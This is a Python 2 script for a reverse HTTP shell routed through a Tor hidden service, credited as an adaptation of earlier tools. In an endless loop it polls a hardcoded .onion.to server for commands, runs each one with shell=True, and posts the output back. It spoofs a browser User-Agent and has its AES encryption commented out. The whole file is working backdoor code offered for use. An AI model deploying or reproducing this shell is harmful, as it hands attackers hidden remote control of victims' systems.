#!/usr/bin/python

#   Author = j0lly@anche.no
#   BSD License
#
#   this code is an enanchment of an http encrypted reverse python shell fnd listener rom:
#
#         Dave Kennedy (ReL1K) http://www.secmaniac.com
#
#   most of the code come from him, I've just lean it and added the option to work with tor network.
#   The idea of a toryfied connection like this is not mine either, but come from:
#
#        Xavier Garcia http://www.shellguardians.com
#

import urllib
import urllib2
import httplib
import subprocess
import sys
import base64
import os
from Crypto.Cipher import AES


# the block size for the cipher object; must be 16, 24, or 32 for AES
BLOCK_SIZE = 32
# the character used for padding--with a block cipher such as AES, the value
# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
# used to ensure that your value is always a multiple of BLOCK_SIZE
PADDING = '{'
# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

# secret key, change this if you want to be unique
secret = "Fj39@vF4@54&8dE@!)(*^+-pL;'dK3J2"

# set our basic headers
headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)","Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}

# create a cipher object using the random secret
cipher = AES.new(secret)

# YOUR TOR SERVER
server = "gx32knlxeynsijug.onion.to"

# loop forever
while 1:

        # open up our request handelr
        req = urllib2.Request( 'https://' + server , headers=headers)
	# grab our response which contains what command we want
	message = urllib2.urlopen(req)
	# base64 unencode
	message = base64.b64decode(message.read())
#	# decrypt the communications
#	message = DecodeAES(cipher, message)
	# quit out if we receive that command
	if message == "quit" or message == "exit":
                sys.exit()
	# issue the shell command we want
	proc = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	# read out the data of stdout
	data = proc.stdout.read() + proc.stderr.read()
#	# encrypt the data
#	data = EncodeAES(cipher, data)
	# base64 encode the data
	data = base64.b64encode(data)
	# urlencode the data from stdout
	data = urllib.urlencode({'cmd': '%s'}) % (data)
	# who we want to connect back to with the shell
	h = httplib.HTTPSConnection(server)
	# actually post the data
	h.request('POST', '/index.aspx', data, headers)
